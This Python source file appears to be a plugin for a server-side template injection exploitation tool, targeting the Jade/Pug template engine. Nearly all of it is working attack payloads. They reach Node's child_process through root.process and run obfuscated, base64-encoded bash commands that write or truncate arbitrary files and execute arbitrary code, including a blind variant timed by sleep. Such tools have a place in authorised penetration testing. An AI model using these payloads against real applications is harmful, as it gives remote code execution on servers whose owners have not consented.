from utils.strings import quote
from plugins.languages import javascript
from utils.loggers import log
from utils import rand
import base64
import re

class Jade(javascript.Javascript):
    
    def init(self):

        self.update_actions({
            'render' : {
                'render': '= %(code)s',
                'header': '= %(header)s',
                'trailer': '= %(trailer)s',
                'test_render': '= %(n1)s*%(n2)s' % { 
                    'n1' : rand.randints[0], 
                    'n2' : rand.randints[1]
                },
                'test_render_expected': '%(res)s' % { 
                    'res' : rand.randints[0]*rand.randints[1] 
                }
            },
            'write' : {
                'call' : 'inject',
                'write' : """- var x = root.process
- x = x.mainModule.require
- x = x('child_process')
= x.exec('bash -c {tr,_-,/+}<<<%(chunk_b64)s|{base64,--decode}>>%(path)s')""",
                'truncate' : """- var x = root.process
- x = x.mainModule.require
- x = x('child_process')
= x.exec('bash -c {echo,-n,}>%(path)s')"""
            },
            'execute' : {
                'call': 'inject',
                'execute_blind': """- var x = root.process
- x = x.mainModule.require
- x = x('child_process')
= x.exec('bash -c {eval,$({tr,/+,_-}<<<%(code_b64)s|{base64,--decode})}')"""
            },
            'execute_blind' : {
                'call': 'inject',
                'execute_blind': """- var x = root.process
- x = x.mainModule.require
- x = x('child_process')
= x.exec('bash -c {eval,$({tr,/+,_-}<<<%(code_b64)s|{base64,--decode})}&&{sleep,%(delay)s}')"""
            },
        })

        self.set_contexts([

            # Text context, no closures
            { 'level': 0 },
            
        ])
